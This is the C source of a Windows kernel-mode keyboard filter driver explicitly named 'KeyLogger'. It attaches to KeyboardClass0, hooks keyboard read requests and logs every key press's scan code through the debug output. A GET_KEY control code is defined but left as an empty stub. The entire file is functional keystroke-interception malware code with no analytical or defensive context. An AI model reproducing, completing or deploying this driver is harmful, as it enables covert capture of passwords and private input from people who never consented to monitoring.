#include <ntddk.h>
#include <ntddkbd.h>
#include <tchar.h>

#pragma warning(disable: 5045) //Disable Spectre

#define DEVICE_NAME						\
	_T("KeyLogger")

#define DEVICE_PATH						\
	_T("\\Device\\") DEVICE_NAME

#define KEYBOARD_DEVICE_NAME				\
	_T("KeyboardClass0")

#define KEYBOARD_DEVICE_PATH				\
	_T("\\Device\\") KEYBOARD_DEVICE_NAME

#define SYMBOLIC_LINK_NAME				\
	_T("\\DosDevices\\KeyLogger")

#define IOCTL(CODE)						\
	CTL_CODE(							\
		FILE_DEVICE_UNKNOWN,			\
		0x800 + CODE,					\
		METHOD_BUFFERED,				\
		FILE_ANY_ACCESS)

#define GET_KEY IOCTL(1)

#pragma pack(push, 1)

typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT pTargetDeviceObject;

} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

#pragma pack(pop)

VOID
UnloadRoutine(
	PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pDeviceExtension = pDriverObject->DeviceObject->DeviceExtension;

	IoDetachDevice(pDeviceExtension->pTargetDeviceObject);
	IoDeleteDevice(pDriverObject->DeviceObject);
}

NTSTATUS
IrpForwarding(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp)
{
	IoSkipCurrentIrpStackLocation(pIrp);

	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;
	return IoCallDriver(pDeviceExtension->pTargetDeviceObject, pIrp);
}

NTSTATUS
HookCompletionRoutine(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp,
	PVOID pContext)
{
	UNREFERENCED_PARAMETER(pContext);

	if (NT_SUCCESS(pIrp->IoStatus.Status))
	{
		PKEYBOARD_INPUT_DATA keyInfo = pIrp->AssociatedIrp.SystemBuffer;

		if (!keyInfo->Flags)
			DbgPrint("KeyLogger: %hu", keyInfo->MakeCode);
	}

	ObfDereferenceObject(pDeviceObject);

	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	return pIrp->IoStatus.Status;
}

NTSTATUS
HookRoutine(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp)
{
	IoCopyCurrentIrpStackLocationToNext(pIrp);

	NTSTATUS returnedStatus = IoSetCompletionRoutineEx(
		pDeviceObject, pIrp,
		HookCompletionRoutine,
		NULL, TRUE, TRUE, TRUE);

	if (!NT_SUCCESS(returnedStatus))
		IoSkipCurrentIrpStackLocation(pIrp);
	else
		ObfReferenceObject(pDeviceObject);

	PDEVICE_EXTENSION pDeviceExtencion = pDeviceObject->DeviceExtension;
	return IoCallDriver(pDeviceExtencion->pTargetDeviceObject, pIrp);
}

NTSTATUS
CompleteIrp(
	PIRP pIrp,
	NTSTATUS ntStatus,
	ULONG info)
{
	pIrp->IoStatus.Status = ntStatus;
	pIrp->IoStatus.Information = info;

	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return ntStatus;
}

NTSTATUS
DeviceControlRoutine(
	PDEVICE_OBJECT pDeviceObject,
	PIRP pIrp)
{
	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	ULONG controlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	NTSTATUS exitCode = STATUS_SUCCESS;
	ULONG bytesSnd = 0;

	switch (controlCode)
	{
		case GET_KEY:
		{
			break;
		}

		default:
			exitCode = STATUS_INVALID_PARAMETER;
	}

	return CompleteIrp(pIrp, exitCode, bytesSnd);
}

NTSTATUS
DriverEntry(
	PDRIVER_OBJECT pDriverObject,
	PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pRegistryPath);

	for (INT i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; ++i)
		pDriverObject->MajorFunction[i] = IrpForwarding;

	pDriverObject->MajorFunction[IRP_MJ_READ] = HookRoutine;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControlRoutine;
	pDriverObject->DriverUnload = UnloadRoutine;

	NTSTATUS returnedStatus;

	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName, DEVICE_PATH);
	
	PDEVICE_OBJECT pDeviceObject;

	returnedStatus = IoCreateDevice(
		pDriverObject,
		sizeof(DEVICE_EXTENSION),
		&deviceName,
		FILE_DEVICE_KEYBOARD,
		0, FALSE,
		&pDeviceObject);
	
	if (!NT_SUCCESS(returnedStatus))
		return returnedStatus;

	pDeviceObject->Flags =
		DO_BUFFERED_IO |
		DO_POWER_PAGABLE |
		DO_DEVICE_HAS_NAME |
		DRVO_LEGACY_RESOURCES;

	UNICODE_STRING targetDeviceName;
	RtlInitUnicodeString(&targetDeviceName, KEYBOARD_DEVICE_PATH);

	PDEVICE_EXTENSION pDeviceExtension = pDeviceObject->DeviceExtension;

	returnedStatus = IoAttachDevice(
		pDeviceObject,
		&targetDeviceName,
		&pDeviceExtension->pTargetDeviceObject);

	if (!NT_SUCCESS(returnedStatus))
	{
		IoDeleteDevice(pDeviceObject);
		return returnedStatus;
	}

	return returnedStatus;
}